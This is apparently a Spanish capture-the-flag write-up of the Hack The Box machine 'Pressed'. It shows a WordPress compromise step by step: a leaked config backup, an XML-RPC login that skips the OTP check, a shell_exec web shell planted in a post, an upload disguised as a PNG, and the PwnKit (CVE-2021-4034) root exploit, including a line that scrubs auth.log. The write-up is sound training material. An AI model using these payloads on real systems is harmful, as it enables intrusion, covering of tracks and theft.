---
layout: post
title: Pressed
date: 2023-02-21
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE, OSCP]
---
___

<center><img src="/writeups/assets/img/Pressed-htb/Pressed.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Information Disclosure

* Abuso de XMLRPC

* Explotación de Pwnkit

* Python interactivo

* Modificación /etc/passwd (Shell como root)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.142 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 08:58 GMT
Nmap scan report for 10.10.11.142
Host is up (0.14s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.31 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80 10.10.11.142 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 09:00 GMT
Nmap scan report for 10.10.11.142
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.9
|_http-title: UHC Jan Finals &#8211; New Month, New Boxes
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.80 seconds
```

## Puerto 80 (HTTP)

Con whatweb analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.11.142
http://10.10.11.142 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.142], JQuery[3.6.0], MetaGenerator[WordPress 5.9], Script[text/javascript], Title[UHC Jan Finals &#8211; New Month, New Boxes], UncommonHeaders[link], WordPress[5.9]
```

La página principal se ve así:

<img src="/writeups/assets/img/Pressed-htb/1.png" alt="">

En el código fuente se puede ver un dominio

```null
 curl -s -X GET http://10.10.11.142/ | grep htb
<link rel='dns-prefetch' href='//pressed.htb' />
```

Lo añado al ```/etc/hosts```

Aplico un escano con ```wpscan``` 

```null
 wpscan --url http://pressed.htb/ --api-token $WPTOKEN
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
```

Encuentra un backup del ```wp-config.php```

```null
[!] http://pressed.htb/wp-config.php.bak
 | Found By: Direct Access (Aggressive Detection)
 ```

Lo descargo, y dentro hay credenciales de acceso a la base de datos

```null
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'uhc-jan-finals-2021' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Una sección de la web reporta los User-Agent de todas las peticiones que se han tramitado

<img src="/writeups/assets/img/Pressed-htb/2.png" alt="">

Tramito una petición modificando mi User-Agent, pero no interpreta el código PHP

```null
curl -s -X GET http://10.10.11.142/ -H 'User-Agent: <?php system("whoami"); ?>'
```

<img src="/writeups/assets/img/Pressed-htb/3.png" alt="">

Es probable que sea un rabbit hole. Wp-scan también había encontrado que el XML-RPC está habilitado

```null
[+] XML-RPC seems to be enabled: http://pressed.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 ```

Pruebo a iniciar sesión en el ```wp-login.php``` con la contraseña ```uhc-jan-finals-2021```, pero no es correcta. Sin embargo, como esta máquina es del 2022, al cambiar a ese valor si que es válida

<img src="/writeups/assets/img/Pressed-htb/4.png" alt="">

Solicita una validación por OTP

<img src="/writeups/assets/img/Pressed-htb/5.png" alt="">

Puedo tratar de autenticarme por el ```nullrpc.php```, suponiendo que por aquí no me pide segundo factor de autenticación. Primero listo todos los métodos disponibles

```null
curl -s -X POST http://10.10.11.142/xmlrpc.php -d '<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' | grep -oP '>.*?<' | tr -d '<>' | grep wp
wp.restoreRevision
wp.getRevisions
wp.getPostTypes
wp.getPostType
wp.getPostFormats
wp.getMediaLibrary
wp.getMediaItem
wp.getCommentStatusList
wp.newComment
wp.editComment
wp.deleteComment
wp.getComments
wp.getComment
wp.setOptions
wp.getOptions
wp.getPageTemplates
wp.getPageStatusList
wp.getPostStatusList
wp.getCommentCount
wp.deleteFile
wp.uploadFile
wp.suggestCategories
wp.deleteCategory
wp.newCategory
wp.getTags
wp.getCategories
wp.getAuthors
wp.getPageList
wp.editPage
wp.deletePage
wp.newPage
wp.getPages
wp.getPage
wp.editProfile
wp.getProfile
wp.getUsers
wp.getUser
wp.getTaxonomies
wp.getTaxonomy
wp.getTerms
wp.getTerm
wp.deleteTerm
wp.editTerm
wp.newTerm
wp.getPosts
wp.getPost
wp.deletePost
wp.editPost
wp.newPost
wp.getUsersBlogs
```

Para trabajar más comodamente, instalo un módulo de python. Intento poder editar los posts existentes en la web

```null
pip3 install python-wordpress-xmlrpc
```

```null
Python 3.11.1 (main, Dec 31 2022, 10:23:59) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from wordpress_xmlrpc import Client
>>> from wordpress_xmlrpc.methods import posts
>>> client = Client("http://pressed.htb/xmlrpc.php", 'admin', 'uhc-jan-finals-2022')
>>> post = client.call(posts.GetPosts())
>>> post
[<WordPressPost: b'UHC January Finals Under Way'>]
```

Unicamente hay un post. Puedo intentar ver como está compuesto

```null
>>> post[0].link
'/index.php/2022/01/28/hello-world/'
>>> post[0].content
'<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
```

Le hago un decode a la cadena en base64 y la url-decodeo

```null
echo "JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=" | base64 -d; echo
%3C%3Fphp%20%20echo(file_get_contents('%2Fvar%2Fwww%2Fhtml%2Foutput.log'))%3B%20%3F%3E
❯ php --interactive
Interactive shell

php > echo urldecode("%3C%3Fphp%20%20echo(file_get_contents('%2Fvar%2Fwww%2Fhtml%2Foutput.log'))%3B%20%3F%3E");
<?php  echo(file_get_contents('/var/www/html/output.log')); ?>
```

Imprime el contenido de un log. Puedo tratar de cambiarlo para obtener RCE

```null
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

```null
base64 -w 0 test; echo
PD9waHAKICBlY2hvICI8cHJlPiIgLiBzaGVsbF9leGVjKCRfUkVRVUVTVFsnY21kJ10pIC4gIjwvcHJlPiI7Cj8+Cg==
```

```null
>>> new_post = post[0]
>>> new_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"PD9waHAKICBzaGVsbF9leGVjKCRfUkVRVUVTVFsnY21kJ10pOwo/Pgo=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragra
ph -->\n<p></p>\n<!-- /wp:paragraph -->'
>>> client.call(posts.EditPost(new_post.id, new_post))
True
```

Pero hay reglas de firewall implementas y no puedo ganar acceso como ```www-data```, por lo que es necesario hacer un script en bash que se encargue de crear una ShelloverHTTP

```null
#!/bin/bash


function ctrl_c(){
  echo -e '\n'
  exit 1
}

# Ctrl+C
trap ctrl_c INT

url="http://10.10.11.142/index.php/2022/01/28/hello-world/?cmd="

while [ "$command" != "exit" ]; do
  echo -n "$~ " && read -r command
  command="$(echo $command | tr ' '  '+')"
  curl -s -X GET "$url$command" | grep "<pre>" -A 100 | grep "</pre>" -B 100 | sed 's/<pre>//' | sed 's/<\/pre>//'
done
```

Puedo ver la primera flag

```null
$~ cat /home/htb/user.txt
997036fb9aaeb86406c23ece2e4aaafe
```

# Escalada

Existe el ```pkexec``` y es SUID

```null
$~ which pkexec | xargs ls -l
-rwsr-xr-x 1 root root 23440 Jul 14  2021 /usr/bin/pkexec
```

El problema está en que no tengo conectividad con mi equipo para transferir el ```pwnkit``` por HTTP, por lo que voy a utilizar un script en bash similar

```null
wget https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.sh
```

Vuelvo al ```nullrpc.php``` para poder ejecutarlo

```null
>>> from wordpress_xmlrpc.methods import media
>>> with open ("pkwner.sh", "r") as f:
...     filename= f.read()
... 
>>> campos = { 'name': 'pkwner.sh', 'bits': filename, 'type': 'text/plain' }
>>> client.call(media.UploadFile(campos))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/local/lib/python3.11/dist-packages/wordpress_xmlrpc/base.py", line 38, in call
    raw_result = server_method(*args)
                 ^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 1122, in __call__
    return self.__send(self.__name, args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 1464, in __request
    response = self.__transport.request(
               ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 1166, in request
    return self.single_request(host, handler, request_body, verbose)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 1182, in single_request
    return self.parse_response(resp)
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 1354, in parse_response
    return u.close()
           ^^^^^^^^^
  File "/usr/lib/python3.11/xmlrpc/client.py", line 668, in close
    raise Fault(**self._stack[0])
xmlrpc.client.Fault: <Fault 500: 'Could not write file pkwner.sh (Sorry, you are not allowed to upload this file type.).'>
```

De primeras da un error por el tipo de archivo. Pero le puedo poner otro Content-Type para solucionarlo

```null
>>> campos = { 'name': 'pkwner.png', 'bits': filename, 'type': 'images/png' }
>>> client.call(media.UploadFile(campos))
{'attachment_id': '51', 'date_created_gmt': <DateTime '20230221T15:29:19' at 0x7f28de113950>, 'parent': 0, 'link': '/wp-content/uploads/2023/02/pkwner-1.png', 'title': 'pkwner.png', 'caption': '', 'description': '', 'metadata': False, 'type': 'images/png', 'thumbnail': '/wp-content/uploads/2023/02/pkwner-1.png', 'id': '51', 'file': 'pkwner.png', 'url': '/wp-content/uploads/2023/02/pkwner-1.png'}
```

Al ejecutar la bash pasa a ser SUID, según había definido en el script

```null
system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
       "rm -rf 'GCONV_PATH=.' 'pkwner';"
       "cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;"
       "chmod u+s /bin/bash");
  exit(0);
```

```null
$~ bash /var/www/html/wp-content/uploads/2023/02/pkwner-1.png
██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
CVE-2021-4034 PoC by Kim Schulz
[+] Setting up environment...
[+] Build offensive gconv shared module...
[+] Build mini executor...
hello[+] Nice Job

$~ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash

$~ bash -p -c 'whoami'
root
```

Puedo ver la segunda flag

```null
$~ bash /var/www/html/wp-content/uploads/2023/02/pkwner-7.png
██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
CVE-2021-4034 PoC by Kim Schulz
[+] Setting up environment...
[+] Build offensive gconv shared module...
[+] Build mini executor...
d69d71121dbfab36e96f98b4d947448d
hello[+] Nice Job
```

